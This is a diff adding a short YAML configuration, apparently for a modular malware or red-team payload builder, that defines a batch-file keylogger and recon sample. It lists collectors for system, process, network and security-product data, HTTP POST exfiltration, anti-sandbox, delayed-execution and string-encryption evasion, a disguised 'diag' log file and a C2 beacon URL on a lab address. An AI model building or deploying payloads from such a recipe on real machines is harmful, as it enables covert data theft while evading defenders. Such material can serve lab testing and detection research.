@@ -1,0 +1,19 @@
+name: bat_keylogger_cs_batch_v1
+description: Stealthy batch recon with sandbox checks and delayed execution
+format: batch
+core:
+- core/output
+collectors:
+- collectors/sysinfo
+- collectors/processes
+- collectors/network
+- collectors/security_products
+exfil: exfil/http_post
+arch: arch/sequential
+evasion:
+- evasion/anti_sandbox
+- evasion/delayed_exec
+- evasion/string_encrypt
+vars:
+  OUTPUT_FILE: '%TEMP%\diag_%RANDOM%.log'
+  C2_URL: http://10.0.2.2:9001/beacon
